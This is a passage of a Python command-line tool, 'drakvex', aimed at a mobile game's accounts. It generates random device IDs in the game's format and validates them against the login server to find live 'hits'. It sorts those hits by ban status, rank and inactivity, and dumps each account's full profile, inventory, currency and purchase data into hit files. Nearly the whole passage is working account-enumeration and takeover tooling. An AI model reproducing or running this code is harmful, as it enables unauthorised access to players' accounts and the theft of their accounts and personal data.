    bullet('drop unranked / no rank', color=_YL)
    bullet('drop lookup failures', color=_YL)
    bullet('output: clean_device.txt with raw device ids', color=_GN)
    print()

    path = pick_file(hint='file with device ids, one per line')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    threads_in = ask('threads', default='8')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 8

    os.makedirs(TRASH_DIR, exist_ok=True)
    handles = {
        'clean':    open(os.path.join(TRASH_DIR, 'clean_device.txt'), 'w', encoding='utf-8'),
        'banned':   open(os.path.join(TRASH_DIR, 'dropped_banned.txt'), 'w', encoding='utf-8'),
        'level':    open(os.path.join(TRASH_DIR, 'dropped_level.txt'), 'w', encoding='utf-8'),
        'unranked': open(os.path.join(TRASH_DIR, 'dropped_unranked.txt'), 'w', encoding='utf-8'),
        'invalid':  open(os.path.join(TRASH_DIR, 'dropped_invalid.txt'), 'w', encoding='utf-8'),
    }
    lock = threading.Lock()

    dash = LiveDash(total=len(ids), label=f'trash remover / {os.path.basename(path)}', workers=threads)
    dash.set_file(os.path.basename(path))
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_trash_worker, dash, d, handles, lock) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()
        for fh in handles.values():
            try:
                fh.close()
            except Exception:
                pass

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('scanned', commas(len(ids)))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s')
              .sep()
              .kv('kept clean', commas(s['clean']), vc=_GN))
    card_b = (Card('Dropped', width=cw)
              .kv('banned', commas(s['banned']), vc=_RD)
              .kv('level <= 7', commas(s.get('dropped_low', 0)), vc=_YL)
              .kv('unranked', commas(s.get('dropped_unranked', 0)), vc=_YL)
              .kv('invalid / failed', commas(s['fail']), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'clean list: {os.path.join(TRASH_DIR, "clean_device.txt")}')
    log('INFO', f'drops saved under {os.path.basename(TRASH_DIR)}/')
    press_enter()


def _rank_worker(dash, device_id, handles, lock):
    dash.tick_worker()
    res = probe_device(device_id)
    st = res.get('status')

    if st == 'banned':
        dash.bump('banned')
        dash.bump('done')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        return

    if st != 'clean':
        dash.bump('fail')
        dash.bump('done')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        return

    rank = res.get('rank', '')
    folder = rank_folder_for(rank)
    if not folder:
        dash.bump('dropped')
        dash.bump('done')
        dash.push('drop', f'{trunc(device_id, 30)}  no rank folder')
        return

    lts = res.get('last_login_ts', 0)
    if lts:
        try:
            last_dt = datetime.datetime.fromtimestamp(lts, datetime.timezone.utc)
            now = datetime.datetime.now(datetime.timezone.utc)
            days = (now - last_dt).days
        except Exception:
            days = 999
    else:
        days = 999

    sub = 'inactive_1-14d' if days < 15 else 'inactive_15d_up'
    key = (folder, sub)

    with lock:
        h = handles['rank'].get(key)
        if h is None:
            fdir = os.path.join(RANK_DIR, folder)
            os.makedirs(fdir, exist_ok=True)
            h = open(os.path.join(fdir, f'{sub}.txt'), 'w', encoding='utf-8')
            handles['rank'][key] = h
        h.write(device_id + '\n')

    tier = res.get('collector_tier', '') or ''
    for pk, pname in PEAK_TIERS.items():
        if tier.startswith(pname):
            with lock:
                handles['peak'][pk].write(device_id + '\n')
            dash.bump('peak')
            break

    dash.bump('ok')
    dash.bump('clean')
    dash.push('clean', f'{trunc(device_id, 30)}  {rank}  {sub}')
    dash.bump('done')


def run_rank_categorizer():
    section('Rank Categorizer')
    print()
    bullet('scan ids, sort into per-rank folders', color=_CY)
    bullet('inactive_1-14d.txt and inactive_15d_up.txt inside each', color=_CY)
    bullet('premium collector tiers also copied to Peak_Hits/', color=_MG)
    bullet('output: raw device ids, one per line', color=_GN)
    print()

    path = pick_file(hint='file with device ids (e.g. clean_device.txt)')
    if not path:
        return

    try:
        ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        press_enter()
        return

    if not ids:
        log('ERROR', 'no device ids in file')
        press_enter()
        return

    threads_in = ask('threads', default='8')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 8

    if os.path.exists(RANK_DIR):
        try:
            existing = sum(1 for _ in os.listdir(RANK_DIR))
        except OSError:
            existing = 0
        if existing:
            ans = ask(f'rank_split/ has {existing} entries - overwrite? (y/N)',
                      default='n')
            if ans.lower() not in ('y', 'yes'):
                log('WARNING', 'aborted - kept existing rank_split/')
                return
        shutil.rmtree(RANK_DIR, ignore_errors=True)
    os.makedirs(RANK_DIR, exist_ok=True)
    os.makedirs(os.path.join(RANK_DIR, 'Peak_Hits'), exist_ok=True)

    peak_dir = os.path.join(RANK_DIR, 'Peak_Hits')
    handles = {
        'rank': {},
        'peak': {pk: open(os.path.join(peak_dir, f'{pk}.txt'), 'w', encoding='utf-8')
                 for pk in PEAK_TIERS},
    }
    lock = threading.Lock()

    dash = LiveDash(total=len(ids), label=f'rank sort / {os.path.basename(path)}', workers=threads)
    dash.set_file(os.path.basename(path))
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_rank_worker, dash, d, handles, lock) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()
        for h in handles['rank'].values():
            try:
                h.close()
            except Exception:
                pass
        for h in handles['peak'].values():
            try:
                h.close()
            except Exception:
                pass

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('scanned', commas(len(ids)))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s')
              .sep()
              .kv('sorted', commas(s['clean']), vc=_GN)
              .kv('peak hits', commas(s['peak']), vc=_MG))
    card_b = (Card('Skipped', width=cw)
              .kv('banned', commas(s['banned']), vc=_RD)
              .kv('dropped', commas(s['dropped']), vc=_YL)
              .kv('failed', commas(s['fail']), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'output: {RANK_DIR}')
    press_enter()


def pick_rank_file():
    if not os.path.isdir(RANK_DIR):
        log('ERROR', 'rank_split folder not found - run rank categorizer first')
        return None

    entries = []
    for rn in sorted(os.listdir(RANK_DIR)):
        rp = os.path.join(RANK_DIR, rn)
        if not os.path.isdir(rp):
            continue
        for fname in sorted(os.listdir(rp)):
            if not fname.endswith('.txt'):
                continue
            fp = os.path.join(rp, fname)
            try:
                sz = os.path.getsize(fp)
                with open(fp, 'r', encoding='utf-8') as f:
                    n = sum(1 for ln in f if ln.strip())
            except OSError:
                sz = 0
                n = 0
            entries.append((rn, fname, fp, sz, n))

    if not entries:
        log('ERROR', 'no files inside rank_split')
        return None

    print()
    print(f'  {_CY}rank_split{_RST}')
    for i, (rn, fn, fp, sz, n) in enumerate(entries, 1):
        c = palette('aurora')[i % 4]
        label = f'{rn}/{fn}'
        print(f'  {hex_ansi(c)}[{i:>2}]{_RST}  '
              f'{_WH}{pad_right(label, 42)}{_RST}  '
              f'{_DIM}{n:>5} ids  {human_bytes(sz)}{_RST}')
    print()
    print(f'  {_DIM}enter number or q to cancel{_RST}')

    try:
        raw = input(f'  {_CY}>{_RST} ').strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None

    if not raw or raw.lower() == 'q':
        return None
    if raw.isdigit():
        idx = int(raw)
        if 1 <= idx <= len(entries):
            return entries[idx - 1][2]
    return None


def _kvline(key, val, w=17):
    return f"    {key:<{w}} {val}"


def _build_save_block(pd, hit_num):
    sb = pd.get('skin_breakdown', {})
    ban = pd.get('ban_status', 'CLEAN')

    lines = [
        "=" * 68,
        f"  FULL INFO #{hit_num:03d}",
        "=" * 68,
        "",
        f"  {G_ACCOUNT} account",
        _kvline("device id", pd.get('_device', '')),
        _kvline("account id", pd.get('_account', 0)),
        _kvline("zone id", pd.get('_zone', 0)),
        _kvline("name", fv(pd.get('nickname'))),
        _kvline("level", fv(pd.get('level'), 0)),
        _kvline("region", fv(pd.get('region_country'))),
        _kvline("location", fv(pd.get('location'))),
        _kvline("last login", fv(pd.get('last_login'))),
        _kvline("created", fv(pd.get('creation_date'))),
        _kvline("account age", fv(pd.get('account_age'))),
        "",
        f"  {G_BAN} ban status",
        _kvline("status", ban),
    ]
    if ban == 'BANNED':
        lines.extend([
            _kvline("reason", fv(pd.get('ban_reason'), 'unknown')),
            _kvline("ban code", fv(pd.get('ban_code'), '-')),
            _kvline("duration", fv(pd.get('ban_duration'), '-')),
        ])

    lines.extend([
        "",
        f"  {G_RANK} progress",
        _kvline("current rank", fv(pd.get('current_rank'))),
        _kvline("highest rank", fv(pd.get('high_rank'))),
        _kvline("achievement pts", f"{pd.get('achievement_points', 0):,} pts"),
        _kvline("collector tier", fv(pd.get('collector_tier'))),
        _kvline("collector points", f"{pd.get('collector_point', 0):,} pts"),
        _kvline("mcl wins", f"{pd.get('mcl_champion_wins', 0):,}"),
        _kvline("total battles", f"{pd.get('total_battles', 0):,}"),
        _kvline("win rate", fv(pd.get('win_rate'))),
        "",
        f"  {G_SKIN} inventory",
        _kvline("heroes", f"{pd.get('hero_count', 0):,}"),
        _kvline("skins", f"{pd.get('skin_count', 0):,}"),
        _kvline("diamonds", f"{pd.get('diamonds', 0):,}"),
        _kvline("battle points", f"{pd.get('battle_points', 0):,}"),
        _kvline("tickets", f"{pd.get('tickets', 0):,}"),
        "",
        f"  {G_SKIN} skin breakdown",
        _kvline("supreme", sb.get('Supreme Skins', 0)),
        _kvline("grand", sb.get('Grand Skins', 0)),
        _kvline("exquisite", sb.get('Exquisite Skins', 0)),
        _kvline("deluxe", sb.get('Deluxe Skins', 0)),
        _kvline("exceptional", sb.get('Exceptional Skins', 0)),
        _kvline("common", sb.get('Common Skins', 0)),
        "",
        f"  {G_SOCIAL} social",
        _kvline("followers", f"{pd.get('followers', 0):,}"),
        _kvline("likes", f"{pd.get('likes', 0):,}"),
        _kvline("affinity", fv(pd.get('affinity'))),
        _kvline("credits score", fv(pd.get('credits_score'))),
        _kvline("squad", fv(pd.get('squad'))),
        _kvline("squad motto", fv(pd.get('squad_motto'))),
        "",
        f"  {G_STATUS} status",
        _kvline("v2l", fv(pd.get('v2l_status'), 'Unknown')),
        _kvline("starlight", fv(pd.get('starlight_user'))),
        _kvline("starlight expiry", fv(pd.get('starlight_expiry'))),
        _kvline("starlight months", fv(pd.get('starlight_months'), 0)),
        _kvline("restriction", fv(pd.get('restriction_flags'), 'None')),
        _kvline("last diamond buy", fv(pd.get('last_diamond_purchase'))),
        "",
        f"  {G_EXTRA} extras",
        _kvline("latest skin", fv(pd.get('latest_skin_id'))),
        _kvline("latest skin date", fv(pd.get('latest_skin_date'))),
    ])

    lm = pd.get('last_match')
    if lm:
        lines.extend([
            "",
            f"  {G_MATCH} last match",
            _kvline("hero", lm.get('hero', '?')),
            _kvline("result", lm.get('result', '?')),
            _kvline("mode", lm.get('mode', '?')),
            _kvline("kda", lm.get('kda', '?')),
            _kvline("kda ratio", lm.get('kda_ratio', 0)),
            _kvline("duration", lm.get('duration', '?')),
            _kvline("gold", f"{lm.get('gold', 0):,}"),
            _kvline("mvp", "yes" if lm.get('mvp') else "no"),
            _kvline("played", fv(lm.get('played_at'))),
        ])

    lh = pd.get('last_heroes_purchase') or []
    lines.append(_kvline("heroes bought", ", ".join(lh) if lh else "-"))

    em = pd.get('emblem_levels') or []
    lines.append(_kvline("emblems", ", ".join(em) if em else "-"))

    sh = pd.get('skin_history') or []
    if sh:
        lines.append("")
        lines.append(f"  {G_HISTORY} skin history")
        for entry in sh:
            lines.append(f"    {entry}")

    hh = pd.get('hero_history') or []
    if hh:
        lines.append("")
        lines.append(f"  {G_HISTORY} hero history")
        lines.append(f"    {', '.join(hh)}")

    lines.append("")
    lines.append("=" * 68)
    return "\n".join(lines)


_info_hit_lock = threading.Lock()
_hit_counter = [0]


def _format_hit_line(n, pd):
    lm = pd.get('last_match') or {}
    lm_txt = (f"{lm.get('hero','?')} {lm.get('kda','?')} "
              f"{lm.get('result','?')} {lm.get('mode','?')}") if lm else '-'
    return (
        f"{n:04d} | {pd.get('_device','')} | "
        f"{fv(pd.get('nickname'), '?'):<16} | "
        f"{fv(pd.get('current_rank'), '?'):<20} | "
        f"lv{as_int(pd.get('level', 0)):<3} | "
        f"{pd.get('ban_status','?'):<6} | "
        f"v2l={fv(pd.get('v2l_status'), '?'):<8} | "
        f"lm: {lm_txt}"
    )


def _write_last_match(n, pd):
    lm = pd.get('last_match')
    if not lm:
        return
    append_line(FILE_LAST_MATCHES,
                f"{n:04d} | {pd.get('_device','')} | "
                f"{fv(pd.get('nickname'), '?'):<16} | "
                f"{fv(lm.get('played_at'), '?'):<17} | "
                f"{lm.get('hero', '?'):<14} | "
                f"{lm.get('result', '?'):<4} | "
                f"{lm.get('kda', '?'):<11} | "
                f"{lm.get('mode', '?'):<8} | "
                f"{lm.get('duration', '?')}")


def _info_worker(dash, device_id):
    dash.tick_worker()
    res = fetch_info_by_device(device_id)

    if res.get('status') != 'success':
        err = res.get('error', 'unknown')
        dash.record_fail(device_id, err)
        append_line(FILE_ERRORS, f"{device_id} | {err}")
        return

    player = res['player']
    player['_device'] = res.get('device_id', device_id)
    player['_account'] = res.get('account_id', 0)
    player['_zone'] = res.get('zone_id', 0)

    with _info_hit_lock:
        _hit_counter[0] += 1
        n = _hit_counter[0]

    dash.record_hit(device_id,
                    player['_account'],
                    player['_zone'],
                    player)

    block = _build_save_block(player, n)
    append_block(FILE_VALID, block)
    append_line(FILE_HITS, _format_hit_line(n, player))
    _write_last_match(n, player)
    write_extras(player, n)
    write_extras(player, n)

    if player.get('ban_status') == 'BANNED':
        append_line(FILE_BAN,
                    f"{device_id} | reason: {player.get('ban_reason', '?')} "
                    f"| duration: {player.get('ban_duration', '?')}")
    else:
        append_line(FILE_CLEAN,
                    f"{device_id} | account {player['_account']} | zone {player['_zone']}")

    v2l = str(player.get('v2l_status', '')).lower()
    if v2l in ('enabled', 'yes', '1', 'true'):
        append_block(FILE_V2L_YES, block)
    else:
        append_block(FILE_V2L_NO, block)


def bulk_info_check(path, threads):
    try:
        device_ids = load_id_file(path)
    except Exception as e:
        log('ERROR', f'read failed: {e}')
        return

    if not device_ids:
        log('ERROR', 'no device ids in file')
        return

    with _info_hit_lock:
        _hit_counter[0] = 0

    dash = LiveDash(total=len(device_ids), label=f'full info / {os.path.basename(path)}', workers=threads)
    dash.set_file(os.path.basename(path))
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_info_worker, dash, d) for d in device_ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()

    elapsed = time.time() - start
    with dash.mu:
        s = dict(dash.s)
        hits = _hit_counter[0]

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('processed', commas(s['done']))
              .kv('hits', commas(hits))
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{s["done"]/max(elapsed,0.001):.1f}/s'))
    card_b = (Card('Breakdown', width=cw)
              .kv('ok', commas(s['ok']), vc=_GN)
              .kv('failed', commas(s['fail']), vc=_RD)
              .kv('banned', commas(s['banned']), vc=_RD)
              .kv('clean', commas(s['clean']), vc=_GN)
              .kv('v2l on', commas(s['v2l_on']), vc=_GN)
              .kv('v2l off', commas(s['v2l_off']), vc=_YL))
    pair(card_a, card_b)

    divider()
    log('INFO', f'saved: {os.path.basename(FILE_VALID)}')
    log('INFO', f'saved: {os.path.basename(FILE_HITS)}')
    log('INFO', f'saved: {os.path.basename(FILE_V2L_YES)}')
    log('INFO', f'saved: {os.path.basename(FILE_V2L_NO)}')
    log('INFO', f'saved: {os.path.basename(FILE_LAST_MATCHES)}')
    log('INFO', f'saved: {os.path.basename(FILE_BAN)}')
    log('INFO', f'saved: {os.path.basename(FILE_CLEAN)}')
    log('INFO', 'saved: full_info.md')
    log('INFO', 'saved: hits.jsonl')
    log('INFO', 'saved: hits.csv')
    log('INFO', 'saved: INDEX.md')
    write_index()


def run_merge_extract():
    section('Merge + Device ID Extractor')
    print()
    bullet('point it at a folder OR a single file', color=_CY)
    bullet('walks the whole tree, every .txt/.csv/.log/.tsv', color=_CY)
    bullet('extracts every valid device id, dedupes', color=_CY)
    bullet('output: merge_clean_ids.txt', color=_GN)
    print()

    try:
        raw = input(f'  {_CY}path>{_RST} ').strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not raw:
        return

    target = os.path.expanduser(raw)
    if not os.path.exists(target):
        log('ERROR', f'path not found: {target}')
        press_enter()
        return

    exts = ('.txt', '.csv', '.log', '.tsv')

    files = []
    if os.path.isfile(target):
        files.append(target)
    else:
        for root, dirs, names in os.walk(target):
            for n in names:
                if n.lower().endswith(exts):
                    files.append(os.path.join(root, n))

    if not files:
        log('ERROR', f'no .txt/.csv/.log/.tsv files under {target}')
        press_enter()
        return

    print()
    log('INFO', f'scanning {len(files)} file(s) under {target}')
    print()

    all_ids = []
    seen = set()
    per_file = []
    sp = Spinner('extracting').start()
    try:
        for p in files:
            ids = extract_device_ids_from_file(p)
            kept = 0
            for d in ids:
                if d not in seen:
                    seen.add(d)
                    all_ids.append(d)
                    kept += 1
            if kept:
                per_file.append((p, len(ids), kept))
    finally:
        sp.stop()

    if not all_ids:
        log('ERROR', 'no valid device ids found')
        press_enter()
        return

    out_path = os.path.join(OUT_DIR, 'merge_clean_ids.txt')
    with open(out_path, 'w', encoding='utf-8') as f:
        for d in all_ids:
            f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Summary', width=cw)
              .kv('files scanned', commas(len(files)))
              .kv('files with ids', commas(len(per_file)))
              .kv('total hits', commas(sum(n for _, n, _ in per_file)))
              .kv('unique ids', commas(len(all_ids)), vc=_GN))
    card_b = (Card('Top files', width=cw))
    top = sorted(per_file, key=lambda x: x[2], reverse=True)[:6]
    for p, n, kept in top:
        label = os.path.basename(p)[:18] or p[-18:]
        card_b.kv(label, f'{kept} ids')
    if len(per_file) > 6:
        card_b.kv('...', f'+{len(per_file) - 6} more')
    pair(card_a, card_b)

    divider()
    log('SUCCESS', f'wrote {len(all_ids)} unique ids -> {out_path}')
    press_enter()


def _json_default(o):
    try:
        return str(o)
    except Exception:
        return None


def write_extras(player, n):
    try:
        md_path = os.path.join(OUT_DIR, "full_info.md")
        jl_path = os.path.join(OUT_DIR, "hits.jsonl")
        csv_path = os.path.join(OUT_DIR, "hits.csv")
        sb = player.get("skin_breakdown") or {}
        lm = player.get("last_match") or {}

        with open(md_path, "a", encoding="utf-8") as f:
            f.write(f"## {n:04d} \u00b7 {fv(player.get('nickname'), '?')}\n\n")
            f.write("| key | value |\n|---|---|\n")
            for k, v in (
                ("device",    player.get("_device", "")),
                ("account",   player.get("_account", 0)),
                ("zone",      player.get("_zone", 0)),
                ("level",     player.get("level", 0)),
                ("rank",      player.get("current_rank", "?")),
                ("peak",      player.get("high_rank", "?")),
                ("ban",       player.get("ban_status", "?")),
                ("v2l",       player.get("v2l_status", "?")),
                ("collector", player.get("collector_tier", "?")),
                ("skins",     player.get("skin_count", 0)),
                ("heroes",    player.get("hero_count", 0)),
                ("battles",   player.get("total_battles", 0)),
                ("win rate",  player.get("win_rate", "?")),
                ("supreme",   sb.get("Supreme Skins", 0)),
                ("grand",     sb.get("Grand Skins", 0)),
                ("exquisite", sb.get("Exquisite Skins", 0)),
                ("deluxe",    sb.get("Deluxe Skins", 0)),
                ("last hero", lm.get("hero", "?")),
                ("last kda",  lm.get("kda", "?")),
                ("played",    lm.get("played_at", "?")),
            ):
                f.write(f"| {k} | {v} |\n")
            f.write("\n")

        rec = {
            "n": n,
            "device": player.get("_device", ""),
            "account": player.get("_account", 0),
            "zone": player.get("_zone", 0),
            "nickname": player.get("nickname"),
            "level": player.get("level", 0),
            "rank": player.get("current_rank"),
            "peak": player.get("high_rank"),
            "ban": player.get("ban_status"),
            "ban_reason": player.get("ban_reason"),
            "v2l": player.get("v2l_status"),
            "collector": player.get("collector_tier"),
            "skins": player.get("skin_count", 0),
            "heroes": player.get("hero_count", 0),
            "battles": player.get("total_battles", 0),
            "win_rate": player.get("win_rate"),
            "last_match": lm,
        }
        with open(jl_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, default=_json_default) + "\n")

        new_csv = not os.path.exists(csv_path)
        with open(csv_path, "a", encoding="utf-8") as f:
            if new_csv:
                f.write("n,device,account,zone,nickname,level,rank,peak,ban,v2l,"
                        "collector,skins,heroes,battles,win_rate,last_hero,last_kda,last_result\n")
            def esc(v):
                s = str(v if v is not None else "")
                return '"' + s.replace('"', '""') + '"'
            f.write(",".join(esc(x) for x in (
                n,
                player.get("_device", ""),
                player.get("_account", 0),
                player.get("_zone", 0),
                player.get("nickname"),
                player.get("level", 0),
                player.get("current_rank"),
                player.get("high_rank"),
                player.get("ban_status"),
                player.get("v2l_status"),
                player.get("collector_tier"),
                player.get("skin_count", 0),
                player.get("hero_count", 0),
                player.get("total_battles", 0),
                player.get("win_rate"),
                lm.get("hero"),
                lm.get("kda"),
                lm.get("result"),
            )) + "\n")
    except Exception as e:
        try:
            append_line(FILE_ERRORS, f"extras | {type(e).__name__}: {e}")
        except Exception:
            pass


def write_index():
    try:
        entries = []
        for name in (
            "full_info.txt", "full_info.md", "all_hits.txt",
            "hits.jsonl", "hits.csv",
            "last_matches.txt", "banned.txt", "clean.txt",
            "v2l_on.txt", "v2l_off.txt", "errors.txt",
        ):
            p = os.path.join(OUT_DIR, name)
            if os.path.exists(p):
                st = os.stat(p)
                entries.append((name, st.st_size, st.st_mtime))
        if not entries:
            return
        with open(os.path.join(OUT_DIR, "INDEX.md"), "w", encoding="utf-8") as f:
            f.write("# drakvex outputs\n\n")
            f.write("| file | size | modified |\n|---|---|---|\n")
            for name, sz, mt in entries:
                ts = datetime.datetime.fromtimestamp(mt).strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"| {name} | {human_bytes(sz)} | {ts} |\n")
    except Exception:
        pass


def _gen_hex(n):
    return ''.join(random.choice('0123456789abcdef') for _ in range(n))


def _gen_alnum(n):
    pool = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(pool) for _ in range(n))


def generate_device_ids(count):
    out = []
    for _ in range(count):
        imei = _gen_hex(32)
        android = _gen_alnum(16)
        adid = '-'.join((
            _gen_hex(8), _gen_hex(4), _gen_hex(4),
            _gen_hex(4), _gen_hex(12),
        ))
        out.append(f'and_{imei}{android}{adid}')
    return out


def _validate_one(d, hits, lock, dash):
    dash.tick_worker()
    try:
        res = probe_device(d)
    except Exception:
        res = {'status': 'error'}
    st = res.get('status')
    with lock:
        if st in ('clean', 'banned'):
            hits.append((d, res))
        dash.bump('done')
        if st == 'clean':
            dash.bump('clean')
            dash.push('clean', f'{trunc(d, 30)}  lv{res.get("level", 0)}  {res.get("rank", "?")}')
        elif st == 'banned':
            dash.bump('banned')
            dash.push('ban', f'{trunc(d, 30)}  banned')
        else:
            dash.bump('fail')


def run_device_generator():
    section('Device ID Generator')
    print()
    bullet('format matches the game: and_<md5><android><adid>', color=_CY)
    bullet('expect 5-10% live hits across a batch', color=_YL)
    print()
    print(f'  {_DIM}mode:{_RST}')
    print(f'    {_CY}[1]{_RST} generate only')
    print(f'    {_CY}[2]{_RST} generate + validate (scan live, keep hits)')
    print(f'    {_CY}[q]{_RST} cancel')
    print()

    try:
        mode = input(f'  {_CY}>{_RST} ').strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if mode in ('q', '') or mode not in ('1', '2'):
        return

    count_in = ask('how many', default='100')
    try:
        count = max(1, min(100000, int(count_in)))
    except ValueError:
        count = 100

    prefix = ask('filename prefix', default='gen').strip() or 'gen'
    prefix = re.sub(r'[^A-Za-z0-9_\-]', '_', prefix)[:32]

    sp = Spinner(f'generating {count}').start()
    try:
        ids = generate_device_ids(count)
    finally:
        sp.stop()

    if mode == '1':
        fname = f'{prefix}_{count}.txt'
        out_path = os.path.join(OUT_DIR, fname)
        with open(out_path, 'w', encoding='utf-8') as f:
            for d in ids:
                f.write(d + '\n')
        print()
        cw = card_width(2)
        card = (Card('Generated', width=cw)
                .kv('count', commas(count))
                .kv('file', fname)
                .kv('size', human_bytes(os.path.getsize(out_path)))
                .sep()
                .kv('est. hits', f'~{count // 20}-{count // 10}', vc=_GN))
        card_stack(card, per_row=1)
        divider()
        log('SUCCESS', f'wrote {count} ids -> {out_path}')
        press_enter()
        return


    threads_in = ask('threads', default='12')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 12

    raw_path = os.path.join(OUT_DIR, f'{prefix}_{count}_raw.txt')
    with open(raw_path, 'w', encoding='utf-8') as f:
        for d in ids:
            f.write(d + '\n')

    print()
    log('INFO', f'testing {count} ids against the login server...')
    print()

    hits = []
    lock = threading.Lock()
    dash = LiveDash(total=len(ids), label=f'validate / {prefix}', workers=threads)
    dash.set_file(prefix)
    dash.start()

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_validate_one, d, hits, lock, dash) for d in ids]
            for _ in as_completed(futures):
                pass
    except KeyboardInterrupt:
        dash.stop()
        raise
    finally:
        dash.stop()

    elapsed = time.time() - start

    clean_ct = sum(1 for _, r in hits if r.get('status') == 'clean')
    ban_ct   = sum(1 for _, r in hits if r.get('status') == 'banned')

    hit_path = os.path.join(OUT_DIR, f'{prefix}_{count}_hits.txt')
    with open(hit_path, 'w', encoding='utf-8') as f:
        for d, _ in hits:
            f.write(d + '\n')

    clean_path = os.path.join(OUT_DIR, f'{prefix}_{count}_clean.txt')
    with open(clean_path, 'w', encoding='utf-8') as f:
        for d, r in hits:
            if r.get('status') == 'clean':
                f.write(d + '\n')

    ban_path = os.path.join(OUT_DIR, f'{prefix}_{count}_banned.txt')
    with open(ban_path, 'w', encoding='utf-8') as f:
        for d, r in hits:
            if r.get('status') == 'banned':
                f.write(d + '\n')

    print()
    cw = card_width(2)
    card_a = (Card('Validation', width=cw)
              .kv('tested', commas(len(ids)))
              .kv('hits', commas(len(hits)), vc=_GN)
              .kv('elapsed', human_dur(elapsed))
              .kv('rate', f'{len(ids)/max(elapsed,0.001):.1f}/s'))
    card_b = (Card('Breakdown', width=cw)
              .kv('clean', commas(clean_ct), vc=_GN)
              .kv('banned', commas(ban_ct), vc=_RD)
              .kv('miss', commas(len(ids) - len(hits)), vc=_YL)
              .sep()
              .kv('hit rate', f'{len(hits)/max(len(ids),1)*100:.1f}%', vc=_MG))
    pair(card_a, card_b)

    divider()
    log('INFO',    f'raw:   {raw_path}')
    log('INFO',    f'clean: {clean_path}')
    log('INFO',    f'banned:{ban_path}')
    log('SUCCESS', f'hits:  {hit_path}  ({len(hits)} ids)')
    press_enter()


def menu_bulk_info():
    section('Bulk Full Info')
    print()
    print(f'  {_DIM}source:{_RST}')
    print(f'    {_CY}[1]{_RST} nearby / pasted file')
    print(f'    {_CY}[2]{_RST} pick from rank_split folder')
    print(f'    {_CY}[q]{_RST} cancel')
    print()

    try:
        src = input(f'  {_CY}>{_RST} ').strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not src or src.lower() == 'q':
        return

    if src == '2':
        path = pick_rank_file()
    else:
        path = pick_file(hint='file with device ids, one per line')

    if not path:
        return

    threads_in = ask('threads', default='12')
    try:
        threads = max(1, min(32, int(threads_in)))
    except ValueError:
        threads = 12

    bulk_info_check(path, threads)
    press_enter()


def menu_show_paths():
    section('Output Paths')
    for label, p in [
        ('banned',       FILE_BAN),
        ('clean',        FILE_CLEAN),
        ('unknown',      FILE_UNKNOWN),
        ('full info',    FILE_VALID),
        ('all hits',     FILE_HITS),
        ('last matches', FILE_LAST_MATCHES),
        ('v2l on',       FILE_V2L_YES),
        ('v2l off',      FILE_V2L_NO),
        ('errors',       FILE_ERRORS),
        ('merged ids',   os.path.join(OUT_DIR, 'merge_clean_ids.txt')),
        ('trash dir',    TRASH_DIR),
        ('rank dir',     RANK_DIR),
    ]:
        mark = '' if os.path.exists(p) else f'  {_DIM}(not yet){_RST}'
        bullet(f'{pad_right(label, 11)} {_DIM}{p}{_RST}{mark}', color=_CY)
    press_enter()


def main():
    load_saved_devices()
    show_banner()
    _boot_ticker("boot \u00b7 palettes loaded \u00b7 dash armed \u00b7 ready")
    print(f'  {_DIM}output dir: {OUT_DIR}{_RST}')
    print(f'  {_DIM}session glyph: \u29d7 @drakvexxx{_RST}')

    while True:
        choice = menu([
            ('1', 'Banned + Trash Remover', 'scan ids, drop banned / low / unranked / invalid'),
            ('2', 'Rank Categorizer',       'sort clean ids into per-rank folders'),
            ('3', 'Bulk Full Info',         'full profile dump per device id'),
            ('4', 'Merge + Extract IDs',    'dedupe device ids from any text files'),
            ('5', 'Generate Device IDs',    'random ids, ~5-10% live hit rate'),
            ('6', 'Show Output Paths',      'where the files land'),
            ('0', 'Exit',                   'close'),
        ], title='DRAKVEX MENU')

        try:
            if choice == '1':
                run_trash_remover()
            elif choice == '2':
                run_rank_categorizer()
            elif choice == '3':
                menu_bulk_info()
            elif choice == '4':
                run_merge_extract()
            elif choice == '5':
